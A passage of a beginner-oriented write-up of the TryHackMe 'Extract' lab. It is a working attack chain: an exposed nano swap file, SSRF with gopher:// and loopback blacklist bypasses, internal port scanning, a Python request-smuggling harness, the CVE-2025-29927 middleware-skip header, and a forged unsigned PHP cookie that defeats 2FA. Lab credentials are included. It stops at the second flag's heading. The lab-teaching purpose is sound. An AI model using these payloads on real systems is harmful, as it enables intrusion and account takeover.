---
description: "TryHackMe Extract — a librarian rushed some changes before going on holiday and left a nano swap file in the web root. The PDF previewer takes a full URL and fetches it server-side, and its blacklist is a list of substrings: it blocks file:/ and php:// but forgets gopher://, and it blocks the word localhost while 127.0.0.1, 127.1, [::1] and 2130706433 all sail through. gopher:// gives raw TCP, which finds a Next.js API bound to loopback on port 10000 that an nmap of all 65535 ports cannot see. Its only guard is middleware, and CVE-2025-29927 turns that off with one header. Behind it: the first flag and the portal credentials. The portal then hands you its own 2FA state as an unsigned serialized PHP object in a cookie — change b:0 to b:1. Every command, every flag, and every wrong turn explained for a total beginner."
---

# Extract — a swap file, a URL fetcher, and a cookie that grades its own homework

**TryHackMe · challenge: Extract · target: `10.x.x.x` (the lab IP changes per lease)**

> **Both flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays — every
> command, every flag on every command, the payloads, the controls, and all seven wrong turns. The
> flag strings teach nothing; printing them just hands the room's answers to the next person.
> The portal credentials **are** kept, because the second half of the chain is unexplainable
> without them and finding them is itself the lesson.

**The brief.** *"The librarian rushed some final changes to the web application before heading off
on holiday. In the process, they accidentally left sensitive information behind! Your challenge is
to find and exploit the vulnerabilities in the application to extract these secrets."*

Read that before touching anything, because three phrases in it are load-bearing:

- **"librarian"** — expect a library or book-catalogue application.
- **"rushed some final changes ... before heading off on holiday"** — this is the room telling you
  the bug class. Rushed changes leave behind editor backup files, a `.git` directory, a commented-out
  block, a debug endpoint, credentials pasted into a config. **Static files first, always.**
- **"extract these secrets"** — the room is called *Extract*. Two flags suggests two different
  extraction primitives.

None of that is evidence. It is a ranked list of guesses, and the work below is ordered to kill or
confirm the cheap ones first.

## A few words first, for a total beginner

Skip this if you already know it. Nothing below assumes you read it twice.

- **Port** — a numbered door on a machine. One IP address has 65 535 of them. A web server usually
  listens on port 80; remote logins on port 22. "Port 80 is open" is not useful on its own; "port 80
  is Apache 2.4.58" is, because now you can look up what that software gets wrong.
- **HTTP request** — what a browser sends. `GET` means "give me this page". `POST` means "here is
  some data, do something with it" — a login form sends a POST. Every request and reply carries
  **headers**, which are extra `Name: value` lines the user never sees.
- **Query string** — the part of a URL after `?`, like `page.php?url=something`. `url` is the
  **parameter** name and `something` is its value. Parameters are where user input enters an
  application, so they are where you look for bugs.
- **Loopback / `127.0.0.1`** — the address a machine uses to talk to *itself*. A service listening
  only there cannot be reached from the network at all.
- **SSRF** (Server-Side Request Forgery) — you make the *server* fetch a URL of your choosing. It
  matters because the server sits inside the network and can reach things you cannot.
- **Cookie** — a small piece of data the server hands the browser, which the browser sends back on
  every later request. It is how a site remembers you are logged in.
- **Middleware** — code that runs *before* every page in a web application. Convenient place to put
  a login check; catastrophic place if someone finds a way to skip it.
- **CVE** — a public identifier for a specific known vulnerability, like `CVE-2025-29927`.

---

## Phase 1 — Recon: what is even listening?

Two scans at once. The quick one so work can start immediately, the exhaustive one in the background
because the interesting service on a CTF box is sometimes parked on a high, unusual port.

```bash
# exhaustive — every single port, in the background
nmap -sT -p- --min-rate 2000 -T4 -oN nmap-full-tcp.txt 10.x.x.x

# quick — the 1000 most common ports
nmap -sT -T4 --top-ports 1000 -oN nmap-top1000.txt 10.x.x.x
```

Every flag, one by one:

- `nmap` — the standard network scanner. It tries to open a connection to each port and records
  whether anything answered.
- `-sT` — **TCP connect scan**: complete an ordinary, full connection to each port, exactly like a
  browser would. The alternative `-sS` (SYN scan) is faster and quieter, but it hand-crafts raw
  network packets, and that requires administrator (root) privileges. **Check whether you have them
  before queuing a long scan**, with `sudo -n true` — on this session it answered
  `sudo: a password is required`, so `-sT` was the deliberate choice rather than a scan that dies
  five minutes in.
- `-p-` — all 65 535 ports. The bare `-` means "the whole range".
- `--top-ports 1000` — the opposite trade: only the 1000 most commonly open ports. Seconds, not
  minutes.
- `--min-rate 2000` — send at least 2000 packets a second.
- `-T4` — timing template 4, "aggressive": shorter waits before giving up on a silent port.
- `-oN <file>` — write **n**ormal, human-readable output to a file. Save evidence the moment it
  exists.

Both scans agreed:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two open doors out of 65 535. Remember that number — it becomes important later. Everything else
answered `conn-refused`, which is the machine actively saying "nothing is listening here". That is a
positive answer, not silence.

Now ask what is behind them:

```bash
nmap -sT -sV -sC -p 22,80 -oN nmap-services.txt 10.x.x.x
```

- `-sV` — **version detection**: nmap speaks a little of each protocol, provokes the service into
  identifying itself, and matches the reply against a database of known banners.
- `-sC` — run the **default script** set: small safe probes such as grabbing the page title.
- `-p 22,80` — only the ports already known to be open.

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TryBookMe - Online Library
```

Both versions are current, with no useful public exploit. SSH is a *destination* — somewhere to
replay credentials later — not a way in, and emphatically not something to point a password cracker
at. **Password cracking is the last thing you do, never the next thing:** it costs hours to test one
hypothesis that is usually false in a designed room, and a negative result teaches you nothing.

The title is the finding. The brief said "librarian"; the box is a library web app. The mission lives
on port 80.

---

## Phase 2 — Read the application before poking it

This is the rule that pays for itself more than any other: **read every static file before invoking
any endpoint.** The homepage source is free and cannot break anything, and on a rushed-deploy box it
is usually where the mistake is.

```bash
curl -sS -D headers.txt http://10.x.x.x/ -o root.html
```

- `curl` — makes a single HTTP request and prints the answer. Unlike a browser it runs no
  JavaScript and loads no images, so you see exactly what came over the wire.
- `-sS` — `-s` silences the progress bar; the extra capital `S` puts **error messages back on**.
  Plain `-s` hides failures too, and a request that silently never left your machine looks
  identical to one that returned nothing. Make `-sS` a habit.
- `-D <file>` — dump the response **headers** to a file.
- `-o <file>` — write the response **body** to a file.

The headers are unremarkable, and one absence matters: **no cookie is set**, so the public site has
no login. The body, though, is the whole mission:

```html
<li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/dummy.pdf')">Dummy</a></li>
<li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/lorem.pdf')">Lorem</a></li>
```

```javascript
function openPdf(url) {
  const iframe = document.getElementById('pdfFrame');
  iframe.src = 'preview.php?url=' + encodeURIComponent(url);
  iframe.style.display = 'block';
}
```

Read that slowly, because it describes a vulnerability class before a single request is made to it:

1. Clicking a document calls `openPdf()` with a **full URL**, not a filename or an ID.
2. `openPdf()` puts that URL into the query string of **`preview.php?url=...`**.
3. So `preview.php` receives a URL, and to show a preview it must **go and fetch that URL itself,
   from the server, and hand the contents back**. That is SSRF, by construction.
4. The hostname is **`cvssm1`** — not an IP, not `localhost`, not the address you typed. That name
   means something only *on the target*. Your browser could never resolve it, so if previews work at
   all, the resolution and the fetch are happening server-side. The evidence is in the page.

---

## Phase 3 — Five probes, chosen so each result means exactly one thing

```bash
T=http://10.x.x.x
probe(){ echo "===== [$1] $2"
         curl -sS -o /tmp/p.out -w 'HTTP %{http_code}  bytes=%{size_download}\n' "$2"
         head -c 400 /tmp/p.out; }

probe "1 baseline"          "$T/preview.php"
probe "2 POSITIVE CONTROL"  "$T/preview.php?url=http://cvssm1/pdf/dummy.pdf"
probe "3 NEGATIVE CONTROL"  "$T/preview.php?url=http://zzzq7nonexistenthost4242.invalid/"
probe "4 file scheme"       "$T/preview.php?url=file:///etc/passwd"
probe "5 php filter"        "$T/preview.php?url=php://filter/convert.base64-encode/resource=preview.php"
```

`-w '...'` is curl's **write-out** format: after the transfer it prints the fields you name. Here,
the status code and the number of bytes downloaded.

**Why controls, and why they go in the same run.** A *positive control* is a request you know should
succeed; a *negative control* is one you know should fail. Without both, you cannot tell a real
result from a broken tool — and a broken tool almost never announces itself, it just returns a
confident wrong answer. Read the control rows **before** the result rows, every time.

**The control rows:**

| # | Request | Status | Bytes | Body |
|---|---|---|---|---|
| 1 | no parameter | 200 | 19 | `Missing ?url param.` |
| 2 | positive control | 200 | 13 264 | `%PDF-1.4 …` — a real PDF |
| 3 | negative control | 200 | 0 | *(empty)* |

Two things established:

- **The fetcher works and is genuinely server-side.** Probe 2 asked for `http://cvssm1/...`, a name
  that resolves nowhere on your machine, and 13 264 bytes of valid PDF came back.
- **Failure looks like `HTTP 200` with an empty body.** Anyone checking `if status == 200` would
  call the bogus-host request a success. Success must be recognised *positively* — the right bytes
  came back — never as "no error appeared".

**The payload rows:**

| # | Request | Bytes | Body |
|---|---|---|---|
| 4 | `?url=file:///etc/passwd` | 34 | `URL blocked due to keyword: file:/` |
| 5 | `?url=php://filter/…` | 34 | `URL blocked due to keyword: php://` |

Blocked — and that is better news than it looks. Three things follow:

1. **The developer knew.** You only blacklist `file:/` if you understood this endpoint reads
   arbitrary URLs. And a blacklist is not a design, it is *a list of the cases its author happened
   to think of*. A whitelist says "only these are allowed"; a blacklist says "everything is allowed
   except the ones I remembered". The whole game is now finding the one they forgot.
2. **The error names the keyword that matched.** `file:/` with one slash; `php://` with two. The
   application is reciting its own blacklist to you, one entry at a time. That is an **oracle** — a
   mechanism that answers questions about a secret — and it means you can interrogate the filter
   instead of guessing at it.
3. **The block happens before the fetch.** Probe 4 returned in 40 ms, same as the empty baseline,
   while the successful fetch took 58 ms. It is a string check on the input, not a failed network
   operation.

---

## Phase 4 — Interrogating the blacklist

```bash
p(){ printf '%-46s -> ' "$1"
     curl -sS -G --data-urlencode "url=$1" "$T/preview.php" \
          -w ' [bytes=%{size_download}]' -o /tmp/q.out
     head -c 90 /tmp/q.out; echo; }
```

Two new curl flags, and they matter:

- `-G` — send the data as a **G**ET query string rather than a POST body.
- `--data-urlencode "url=$1"` — **percent-encode** the value before putting it in the query string.
  Necessary because the payloads contain `:`, `/`, `?` and `&`, which are structural characters in a
  URL; pasted raw they get misparsed. Doing this encoding by hand is how people lose an hour to
  their own quoting.

**(a) Is the check case-sensitive?** PHP's stream wrappers are case-**in**sensitive — PHP treats
`FILE://` and `file://` as the same thing — whereas a filter written with a plain substring
comparison is case-**sensitive**. If the developer forgot to lowercase, that mismatch alone is the
whole bypass.

| Payload | Result |
|---|---|
| `file:///etc/passwd` | blocked — `file:/` |
| `FILE:///etc/passwd` | blocked — `file:/` |
| `File:///etc/passwd` | blocked — `file:/` |
| `fiLe:///etc/passwd` | blocked — `file:/` |

All four are reported as matching the *lowercase* keyword, including the ones sent in capitals — so
the filter lowercases first. **The classic case bypass is dead here.** Recording a failed attempt is
the point of writing these up: the next reader does not repeat it.

**(b) Which schemes are blocked, and which are not?**

| Payload | Result |
|---|---|
| `php://filter/…` | blocked — `php://` |
| `data://text/plain,hello` | blocked — `data://` |
| `dict://127.0.0.1:3306/` | blocked — `dict://` |
| `ftp://127.0.0.1/` | blocked — `ftp://` |
| `zip:///tmp/a.zip` | blocked — **`ip://`** |
| `gopher://127.0.0.1:80/_x` | **NOT blocked** — 483 bytes came back |
| `http://cvssm1/` | fetched the homepage |

The blacklist is roughly: `file:/`, `php://`, `data://`, `dict://`, `ftp://`, `ip://`, `localhost`.
The `zip://` row is the giveaway that these are **plain substring matches** — it was rejected for
containing `ip://`, a fragment nobody blacklists on purpose.

The `gopher://` row is the prize. Gopher is a document protocol from 1991, effectively dead, and its
client sends whatever text is in the URL path straight down a raw TCP socket. What came back was:

```
HTTP/1.1 400 Bad Request
Server: Apache/2.4.58 (Ubuntu)
```

That is the target's own Apache complaining that `_x` is not valid HTTP — relayed back in full. Two
conclusions:

1. **The fetcher is PHP's cURL**, not `file_get_contents`. PHP's built-in stream wrappers have no
   gopher support; cURL does. This also explains why `file:/` needed blacklisting (cURL reads
   `file://` happily) and why `php://filter` was never going to work here even unblocked — cURL does
   not know PHP's wrappers. **The developer blacklisted a scheme that was never exploitable and left
   one that is.**
2. **`gopher://` is arbitrary TCP to anywhere the server can reach**, with the reply handed back.

**(c) Are internal hosts filtered, or only schemes?**

| Payload | Result |
|---|---|
| `http://localhost/` | blocked — `localhost` |
| `http://127.0.0.1/` | **the homepage** |
| `http://0.0.0.0/` | the homepage |
| `http://[::1]/` | the homepage |
| `http://2130706433/` | the homepage |
| `http://127.1/` | the homepage |

Five ways of writing "this machine", five successes, one blocked spelling. `2130706433` is the same
address written as a single 32-bit integer; `127.1` is the short form; `[::1]` is IPv6. **The filter
enumerated spellings instead of resolving the address**, which is the blacklist failure in
miniature.

---

## Phase 5 — The thing the librarian left behind

Filter bypasses are fun, but go back to the brief: *"rushed some final changes ... accidentally left
sensitive information behind"* describes **files on the server that were never meant to ship**. That
is the cheapest untested hypothesis and the one the room's own wording points at.

No wordlist needed for this — it is a fixed list, requested by hand, with a deliberate nonsense path
at the end as a negative control:

```bash
for u in robots.txt sitemap.xml .env .git/HEAD .git/config .htaccess composer.json package.json \
         preview.php.bak preview.php~ .preview.php.swp preview.php.save preview.php.old \
         index.php.bak index.php~ .index.php.swp config.php config.php.bak backup.zip \
         ThisDefinitelyDoesNotExist12345; do
  printf '%-30s ' "$u"
  curl -sS -o /tmp/f.out -w 'HTTP %{http_code} bytes=%{size_download}' "$T/$u"
  echo "  | $(head -c 60 /tmp/f.out)"
done
```

The control row first:

```
ThisDefinitelyDoesNotExist12345   HTTP 404 bytes=276
```

276 bytes is therefore this server's "not found" signature. Now every row that returns exactly that
is genuinely absent, and the negatives can be trusted instead of hoped at.

Three rows break the pattern:

```
.htaccess                         HTTP 403 bytes=279
pdf/                              HTTP 200 bytes=0
.preview.php.swp                  HTTP 200 bytes=1024   | b0nano 7.2   ubuntu
```

- `.htaccess` — **403 Forbidden**, not 404. The difference matters: 404 means "no such file", 403
  means "it is there, you may not have it". Apache blocks this file by default. Expected.
- `pdf/` — 200 with zero bytes: the directory exists, has no index page, and directory listing is
  off.
- **`.preview.php.swp`** — 200, and the body begins `b0nano 7.2`.

**What a `.swp` file is, and why one is on a web server.** When you edit a file in a terminal text
editor, the editor keeps a **swap file** — a running copy of your work, so that if the terminal dies
your edit can be recovered. `nano` names it after the file being edited, with a leading dot and a
`.swp` suffix, **in the same directory**: editing `preview.php` creates `.preview.php.swp`. The
leading dot hides it from a normal `ls`, which is exactly why it survives a tidy-up — and Apache
serves it as an unknown file type rather than executing it, so its contents come back verbatim to
anyone who guesses the name.

This is also why that fixed list carries **six spellings of the same backup**. `.bak`, `~`, `.swp`,
`.save`, `.old` are different editors' and different humans' habits. You do not know which was used,
so you ask for all of them. Five were 404. One was not, and one is enough.

```bash
curl -sS -o preview.php.swp http://10.x.x.x/.preview.php.swp
file preview.php.swp
xxd preview.php.swp | head -5
```

- `file` — identifies a file by its content (its "magic bytes") rather than its name.
- `xxd` — a **hex dump**: every byte as a hexadecimal number alongside its printable character. You
  use it when a file is not plain text and you need to see what is actually in it.

```
Nano swap file, pid 1181, user ubuntu, host cvssm1, file preview.php, modified

00000000: 6230 6e61 6e6f 2037 2e32 0000 0000 0000  b0nano 7.2......
00000010: 0000 0000 0000 0000 9d04 0000 7562 756e  ............ubun
00000020: 7475 0000 0000 0000 0000 0000 0000 0000  tu..............
00000040: 0000 0000 6376 7373 6d31 0000 0000 0000  ....cvssm1......
00000060: 0000 0000 0000 0000 0000 0000 7072 6576  ............prev
00000070: 6965 7720 2e70 6870 0000 0000 0000 0000  iew.php.........
```

**And here is the disappointment, kept in because it is the honest result.** A nano swap file is a
1024-byte header followed by the editor's buffer. This one is *only* the header — strip the null
bytes and **36 bytes** of actual data remain, all metadata:

```bash
tr -d '\0' < preview.php.swp | wc -c    # -> 36
```

No source code. What it *does* give:

- The application runs as the OS user **`ubuntu`**.
- The hostname is **`cvssm1`**, confirming the homepage's links point at this same machine.
- **`preview.php` is the file that was being edited when the librarian ran out of time.** Of every
  file on the box, the SSRF endpoint is the one that was mid-edit. That is the room pointing at its
  own answer.

---

## Phase 6 — A wordlist sweep, done safely

```bash
grep -viE '^(setup|install|reset|clear|block|seed|migrate|init|delete|drop|truncate|purge|shutdown|reboot|logout|destroy|wipe|remove)$' \
    /usr/share/seclists/Discovery/Web-Content/common.txt > /tmp/wl.txt
printf 'index\npreview\nZZnegativecontrolZZ\n' >> /tmp/wl.txt

ffuf -u 'http://10.x.x.x/FUZZ' -w /tmp/wl.txt \
     -e .php,.txt,.bak,.swp,.old,.zip -t 25 -mc all -fs 276
```

- **That `grep -viE` line strips destructive names out of the wordlist before it is used, and it is
  not optional.** A content sweep is *not* a read-only operation: it issues a real GET to every path
  it can name. A URL called `reset` or `install` is a **write** no matter that the HTTP spec calls
  GET "safe". A filename is a claim about behaviour, not a promise. `-v` inverts the match (keep
  what does *not* match), `-i` ignores case, `-E` selects extended regular expressions where `|`
  means alternation. 4749 words in, 4742 out.
- **The `printf` line appends the controls.** `index` and `preview` are known to exist, so they must
  appear as hits. `ZZnegativecontrolZZ` cannot exist, so it must not. Both ride in the *same* run —
  a control run separately proves nothing about this run.
- `-u ... /FUZZ` — `FUZZ` marks where each word is substituted.
- `-e .php,.txt,.bak,.swp,.old,.zip` — try each word with each extension as well as bare: seven
  requests per word.
- `-t 25` — 25 concurrent threads. Deliberately modest: a lab VM has one virtual CPU, and `-t 80`
  knocks it over, after which you are no longer testing the target, you are debugging your own
  traffic.
- `-mc all -fs 276` — **match** all status codes, then **filter out** responses of exactly 276
  bytes, the 404 signature measured in the previous phase. Both halves are deliberate: ffuf's
  default `-mc` list *omits 404*, so an interesting 404 would vanish silently, and ffuf's matchers
  are **OR**-ed together, so adding more `-m` flags widens the net rather than narrowing it.
  Filtering by size is how you narrow it.

**Work out the cost before starting anything long:** 4742 words × 7 = 33 194 requests, at 25 threads
and ~40 ms each ≈ 53 seconds. Actual: 28 seconds. If that sum had come out in hours, the answer is a
different plan, not a longer wait.

| Path | Status | Size | Verdict |
|---|---|---|---|
| `index.php` | 200 | 1735 | positive control — found |
| `preview.php` | 200 | 19 | positive control — found |
| `ZZnegativecontrolZZ` | — | — | negative control — correctly absent |
| **`management`** | 301 | 321 | **new** |
| `javascript` | 301 | 321 | Debian's stock alias — noise |
| `server-status` | 403 | 279 | Apache's own, forbidden |

---

## Phase 7 — An access check the SSRF walks straight past

```
management/           HTTP 403  bytes=14   body: Access denied.
management/index.php  HTTP 403  bytes=14   body: Access denied.
```

**14 bytes.** That number is the finding. Apache's own 403 page is 279 bytes of HTML — measured
moments ago on `.htaccess`. `Access denied.` is 14 bytes of plain text with no HTML around it, so
this refusal is **written by the application**, not by the web server.

That distinction decides the next move. A hand-written access check in a PHP file is nearly always
one of two things: a session check, or a check on the client's IP address — *"only requests from
127.0.0.1 may see this"*. And there is already a way to make the request come from 127.0.0.1.

```bash
curl -sS -G --data-urlencode 'url=http://127.0.0.1/management/' http://10.x.x.x/preview.php
```

Requested from your machine: `Access denied.` Requested by the server, of itself, through
`preview.php`: **a login page**.

```html
<title>TryBookMe - Login</title>
<form method="POST" action="">
  <input type="text"     name="username" ...>
  <input type="password" name="password" ...>
```

Be honest about what that is worth on its own: a login form, no credentials, no hint in the source.
**Reaching a locked door is not opening it.** What it proves is that the SSRF is a general-purpose
way to become a trusted internal client, and that is the primitive the rest of the room uses.

---

## Phase 8 — Port-scanning the machine from inside itself

nmap said two ports. But nmap was standing *outside*. A service bound to `127.0.0.1` is invisible
from there and wide open to a request the server makes to itself. `gopher://` is the tool, because
it opens a raw TCP connection and hands back whatever the service says, so anything that greets on
connect identifies itself.

**Version 1 failed, and the control caught it.** With an empty gopher path:

```
port 22  known-open, expect an SSH banner : [SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11...]
port 80  known-open, expect an Apache 400 : []          <-- WRONG
port 1   expect closed, must be empty     : []
```

Port 80 is demonstrably open — the entire website is served from it — and the probe called it
closed. An empty gopher path sends *nothing*, so Apache sat waiting for a request line until the
timeout. The probe could only see services that speak **first** (SSH, MySQL) and silently
mislabelled every service that waits to be spoken to.

This is the failure mode worth internalising: it produced a **confident wrong answer, not an error**.
Without that port-80 control the sweep would have found nothing and "there are no internal services"
would have gone in the notes as a fact.

**Version 2 failed worse, and taught a second lesson.** The fix was to send a real request in the
gopher path: `_GET / HTTP/1.0%0d%0a%0d%0a`. Now *every* control failed, including port 22 which had
worked before. Cause: `--data-urlencode` encodes what you give it, so `%0d` became a literal `%250d`
and the spaces became `+`, which PHP decoded back into real spaces — and curl rejects a URL
containing raw spaces, so nothing was sent at all.

The real mistake was **changing two things at once** (the payload *and* its encoding), which made
the failure ambiguous. One cause at a time. The recovery was to return to the one payload already
proven to work — `_x`, which had produced Apache's `400 Bad Request` during the blacklist sweep —
because it contains no spaces and no percent signs for the encoder to mangle.

**Version 3 — controls pass, so the result can be believed:**

```
port 80  known-open  -> [HTTP/1.1 400 Bad Request ... Server: Apache ...]
port 22  known-open  -> [SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11...]
port 1   expect closed -> []
port 47  expect closed -> []

PORT 10000  OPEN : HTTP/1.1 400 Bad Request  Connection: close
```

**Port 10000 is listening on loopback and nowhere else.** An exhaustive external scan of all 65 535
ports never saw it. The SSRF makes you the machine.

Fetched with plain `http://` through the SSRF, it is a **Next.js** application (React, server-
rendered — recognisable from the `/_next/static/...` asset paths and the `self.__next_f.push([...])`
hydration payload at the foot of the page):

```
<title>TryBookMe API</title>
<nav><a href="/">Home</a> <a href="/customapi">API</a></nav>
<h2>Warning</h2><p>Unauthorised access to this system is strictly prohibited.</p>
```

### Two dead ends, and the discriminator they earned

**Dead end 1 — the JavaScript bundles.** Reading client-side JavaScript first is the right instinct;
it documents the API. All five chunks plus the stylesheet were pulled through the SSRF, and every
one came back at roughly 7 400 bytes:

```
webpack-8fc0c21e0210cbd2.js   7399 bytes
472-22e55b21ed910619.js       7395 bytes
main-app-321a014647b5278e.js  7400 bytes
polyfills-c67a75d1b6f99dc8.js 7401 bytes
app.css                       7389 bytes
```

Six unrelated files — a stylesheet and five bundles of completely different purpose — landing within
12 bytes of each other is not a coincidence, it is a broken instrument. Checking one by hand:

```bash
head -c 300 webpack-8fc0c21e0210cbd2.js
# -> <!DOCTYPE html><html lang="en"><head>...
```

They are all Next.js **404 pages**. The static assets are not served. A cheap dead end — but an
expensive one if you start grepping 7 KB of "JavaScript" for secrets without checking it is
JavaScript.

**Dead end 2 — guessing route names.** `/api` and `/api/books`: 404.

**So build the discriminator before enumerating anything.** Three requests with known outcomes:

```
/            bytes=6131   title=TryBookMe API
/ZZnope123   bytes=7361   title=404: This page could not be found.
/customapi   bytes=6131   title=TryBookMe API      <-- byte-identical to /
```

Two things here:

- **The reliable signal is the `<title>` tag.** The string "could not be found" appears in **all
  three** responses, good ones included, because Next.js embeds its 404 template inside every page's
  hydration payload. Grepping the body for that phrase would have marked every route as missing —
  a discriminator that fails silently, and it was one line away from being the one used.
- **`/customapi` is byte-identical to `/`.** So the route exists but renders the homepage. Something
  is missing from the request.

---

## Phase 9 — Crafting the whole request: gopher with headers

`preview.php` returns only the response *body*, and sends whatever headers its own cURL sends. To
learn *why* `/customapi` renders the homepage, you need the status line; to test theories, you need
to control the request headers. `gopher://` gives both.

**The encoding trap, which is the entire reason this becomes a script.** An HTTP request needs
spaces and CRLF line endings. In a gopher URL those are written `%20` and `%0d%0a`, and cURL decodes
them back to real bytes before writing to the socket. But that gopher URL travels *inside* another
URL — `preview.php?url=<here>` — and **PHP percent-decodes `$_GET` before `preview.php` ever sees
it**. So a `%20` sent on the wire arrives at cURL as a real space, cURL refuses a URL containing raw
spaces, and nothing is sent. The failure is silent: an empty response, indistinguishable from a
closed port. That is exactly what killed version 2 of the port scanner.

The fix is to **double-encode**: send `%2520`, PHP decodes it to `%20`, cURL decodes that to a space.
Do it once, in code:

```python
import urllib.parse, urllib.request

PREVIEW = "http://10.x.x.x/preview.php"

def gopher_fetch(host, port, raw_request):
    inner = urllib.parse.quote(raw_request, safe="")          # -> %20, %0D%0A
    gopher_url = f"gopher://{host}:{port}/_{inner}"
    outer = urllib.parse.urlencode({"url": gopher_url})       # -> %2520, %250D%250A
    with urllib.request.urlopen(f"{PREVIEW}?{outer}", timeout=15) as r:
        return r.read()

def http_request(host, port, method="GET", path="/", headers=None, body=""):
    headers = headers or {}
    headers.setdefault("Host", f"{host}:{port}")
    headers.setdefault("Connection", "close")
    if body:
        headers.setdefault("Content-Length", str(len(body)))
    lines = [f"{method} {path} HTTP/1.1"] + [f"{k}: {v}" for k, v in headers.items()]
    return gopher_fetch(host, port, "\r\n".join(lines) + "\r\n\r\n" + body)
```

The `_` after the port is gopher's *item-type* byte; cURL strips it and sends everything after it.

Self-test with controls before trusting one result:

```
POSITIVE CONTROL: GET / on Apache:80   -> HTTP/1.1 200 OK, Server: Apache/2.4.58
NEGATIVE CONTROL: closed port 47       -> b''
TARGET: GET /customapi on :10000       -> HTTP/1.1 307 Temporary Redirect
                                          location: http://localhost:10000/
```

**There it is.** `/customapi` answers **307 Temporary Redirect** to `/`. `preview.php`'s cURL follows
redirects automatically and returns the homepage, which is why the two responses looked identical.
The route is not missing; it is being **bounced by something that runs before it**. In a Next.js
application, the thing that runs before every route is **middleware**.

---

## Phase 10 — CVE-2025-29927: switching the middleware off

Fourteen header variations were tried first, one variable at a time: different `Host` values,
`X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `X-API-Key`, `Authorization`, cookies,
`User-Agent`, `Referer`. **Every one still returned 307**, while the `/` control stayed 200
throughout, so the harness was fine.

(One incidental: any payload containing the string `localhost` — even buried inside a header value
in the gopher path — came back `URL blocked due to keyword: localhost`. The blacklist is a substring
match against the whole URL, so it censors your crafted headers too.)

So the middleware is not checking a header value you can guess. **Re-decide.** The question changes
from *"what credential does the middleware want?"* to *"**can I stop the middleware running at
all?**"*

That reframing has a known answer for this exact stack.

**CVE-2025-29927** is an authorisation bypass in Next.js. Next.js uses an internal header,
`x-middleware-subrequest`, to stop middleware recursing into itself when it makes its own
sub-requests. Before the fix, that header was **trusted when it arrived from outside** — so any
client that simply sets it causes middleware to be skipped entirely, including middleware that is
the only thing enforcing authorisation. It fits this target exactly: a Next.js app whose sole
protection on `/customapi` is a middleware redirect.

The accepted value differs by Next.js version, so try all the published variants — with controls:

```
=== CONTROLS ===
  /            no header      -> HTTP/1.1 200 OK
  /customapi   no header      -> HTTP/1.1 307 Temporary Redirect
  /customapi   junk value     -> HTTP/1.1 307 Temporary Redirect   <-- stays 307, good

=== variants against /customapi ===
  middleware                                     -> HTTP/1.1 200 OK  (7288 bytes)
  src/middleware                                 -> HTTP/1.1 307
  pages/_middleware                              -> HTTP/1.1 307
  src/pages/_middleware                          -> HTTP/1.1 307
  middleware:middleware:middleware:middleware:.. -> HTTP/1.1 200 OK  (7288 bytes)
  src/middleware:src/middleware:...              -> HTTP/1.1 307
```

**The junk-value control is what makes this a finding rather than a coincidence.** A nonsense value
for the same header still gets 307, so the 200 is caused by the *value* `middleware`, not by merely
adding an extra header.

The bypassed page says:

> **Maintenance!**
> This API is currently under maintenance. Please use the library portal to add new books using
> **librarian:L1br4r1AN!!**
>
> First flag is **`THM{[redacted]}`**

**Flag 1**, plus a username and password for the portal behind `/management/`.

One small extraction trick: Next.js server-renders into HTML *and* embeds the same content again in
a hydration payload of `self.__next_f.push([1,"..."])` chunks, JavaScript-escaped. Joining the
chunks and running them through `decode('unicode_escape')` turns them back into readable text.
Either copy carries the flag; the plain HTML one reads
`<p ...>First flag is <!-- -->THM{[redacted]}</p>` — that `<!-- -->` is React's text-node separator,
not part of the flag.

---

## Phase 11 — A cookie that grades its own homework

`/management/` refuses anything that is not 127.0.0.1, so the whole login runs through the SSRF as
crafted gopher requests.

Controls first: an unauthenticated GET returns the 1656-byte login page; a POST with a deliberately
wrong password returns `Invalid username or password.` The form discriminates, so a success will
mean something.

POST with the real credentials:

```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=5jq05luh71mf04borhnp3737va; path=/
Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; ...
Location: 2fa.php
```

Percent-decode that second cookie:

```
O:9:"AuthToken":1:{s:9:"validated";b:0;}
```

That is a **serialized PHP object**, and it reads like a sentence once you know the grammar:

| Piece | Meaning |
|---|---|
| `O:9:"AuthToken"` | an **O**bject whose class name is 9 characters long: `AuthToken` |
| `:1:` | it has **1** property |
| `s:9:"validated"` | the property name is a **s**tring of 9 characters: `validated` |
| `b:0;` | its value is a **b**oolean: `0`, false |

**Serialization** means turning an in-memory object into a string so it can be stored or
transmitted; `unserialize()` turns it back. The vulnerability is not serialization itself — it is
*where the string is kept*. The server has written down its own answer to "has this user passed
2FA?" and handed that note to the user, who is the one person with a motive to change it. The cookie
is not signed, so nothing can detect an edit.

So change `b:0` to `b:1`:

```
O:9:"AuthToken":1:{s:9:"validated";b:1;}
```

URL-encoded for the `Cookie:` header, because PHP percent-decodes `$_COOKIE` automatically and it
must go back in the same encoding it came out in:

```
O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
```

### The wrong turn: my own control broke my payload

The first attempt ran three cases on one session — untouched `b:0`, a deliberately malformed cookie,
then the flipped `b:1`:

```
CONTROL untouched  b:0  -> 200, shows the 2FA form        (as expected)
CONTROL malformed       -> 302 -> index.php
PAYLOAD flipped    b:1  -> 302 -> index.php               <-- looks like a failure
```

The flip appeared to fail. It had not. In the very next script the same payload returned **200 OK,
489 bytes** — a page not seen before. Same payload, different result, so something other than the
payload was in play. Tested directly:

```
A: fresh session, FLIP first       -> ('HTTP/1.1 200 OK', 489)
B: fresh session, JUNK then FLIP   -> JUNK ('302', 0) | FLIP ('302', 0)
```

**The malformed cookie destroys the server-side session**, and every later request carrying that
`PHPSESSID` is bounced to `index.php` regardless of what it says.

The rule this earns: **a control must not share mutable state with the payload it is controlling.**
Give every case its own session, or run the payload first. It is an easy one to miss precisely
because adding the control felt like the careful thing to do.

### Flag 2

